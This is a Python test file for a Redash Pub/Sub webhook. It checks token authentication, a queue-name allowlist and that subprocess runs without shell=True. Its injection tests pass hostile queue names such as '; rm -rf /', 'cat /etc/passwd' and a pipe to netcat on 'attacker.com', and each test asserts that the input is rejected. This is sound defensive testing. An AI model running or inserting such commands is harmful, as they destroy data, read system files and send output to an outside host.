import base64
import json
from unittest.mock import patch

from tests import BaseTestCase


def _make_pubsub_payload(queue_name: str) -> bytes:
    """Build a GCP Pub/Sub push message envelope."""
    encoded = base64.b64encode(queue_name.encode()).decode()
    return json.dumps(
        {"message": {"data": encoded, "messageId": "test-123"}}
    ).encode()


class TestWebhookAuthentication(BaseTestCase):
    """Verify the webhook endpoint rejects unauthenticated requests."""

    def _post(self, data, headers=None):
        return self.client.post(
            "/api/subscribe/default",
            data=data,
            headers=headers or {},
            content_type="application/json",
        )

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "")
    def test_rejects_when_token_not_configured(self):
        """Endpoint must be fail-closed when no token is set."""
        rv = self._post(_make_pubsub_payload("default"))
        self.assertEqual(rv.status_code, 403)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "secret-token-123")
    def test_rejects_missing_auth_header(self):
        rv = self._post(_make_pubsub_payload("default"))
        self.assertEqual(rv.status_code, 401)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "secret-token-123")
    def test_rejects_invalid_token(self):
        rv = self._post(
            _make_pubsub_payload("default"),
            headers={"Authorization": "Bearer wrong-token"},
        )
        self.assertEqual(rv.status_code, 403)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "secret-token-123")
    def test_rejects_non_bearer_scheme(self):
        rv = self._post(
            _make_pubsub_payload("default"),
            headers={"Authorization": "Basic secret-token-123"},
        )
        self.assertEqual(rv.status_code, 401)


class TestWebhookQueueValidation(BaseTestCase):
    """Verify that only allowlisted queue names are accepted."""

    def _post_with_auth(self, queue_name):
        return self.client.post(
            "/api/subscribe/default",
            data=_make_pubsub_payload(queue_name),
            headers={"Authorization": "Bearer test-token"},
            content_type="application/json",
        )

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    @patch("redash.handlers.webhooks.WorkerProcess.execute")
    def test_accepts_allowed_queue(self, mock_execute):
        rv = self._post_with_auth("default")
        self.assertEqual(rv.status_code, 204)
        mock_execute.assert_called_once()

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    @patch("redash.handlers.webhooks.WorkerProcess.execute")
    def test_accepts_scheduled_queries_queue(self, mock_execute):
        rv = self._post_with_auth("scheduled_queries")
        self.assertEqual(rv.status_code, 204)
        mock_execute.assert_called_once()

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_unknown_queue(self):
        rv = self._post_with_auth("evil_queue")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_command_injection_in_queue_name(self):
        rv = self._post_with_auth("; rm -rf /")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_shell_metacharacters(self):
        rv = self._post_with_auth("default && cat /etc/passwd")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_backtick_injection(self):
        rv = self._post_with_auth("`whoami`")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_pipe_injection(self):
        rv = self._post_with_auth("default | nc attacker.com 4444")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_empty_queue_name(self):
        rv = self._post_with_auth("")
        self.assertEqual(rv.status_code, 400)

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    def test_rejects_overly_long_queue_name(self):
        rv = self._post_with_auth("a" * 100)
        self.assertEqual(rv.status_code, 400)


class TestWorkerProcessSafety(BaseTestCase):
    """Verify subprocess is called safely (no shell=True)."""

    @patch("redash.handlers.webhooks.WEBHOOK_AUTH_TOKEN", "test-token")
    @patch("redash.handlers.webhooks.subprocess.run")
    def test_subprocess_called_with_list_not_shell(self, mock_run):
        mock_run.return_value = type("Result", (), {"returncode": 0, "stderr": b""})()

        self.client.post(
            "/api/subscribe/default",
            data=_make_pubsub_payload("default"),
            headers={"Authorization": "Bearer test-token"},
            content_type="application/json",
        )

        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        # Must be called with a list, not a string
        self.assertIsInstance(args[0], list)
        # Must NOT use shell=True
        self.assertNotIn("shell", kwargs)
        # Verify the command structure
        self.assertEqual(args[0], ["/app/manage.py", "rq", "worker", "--burst", "default"])
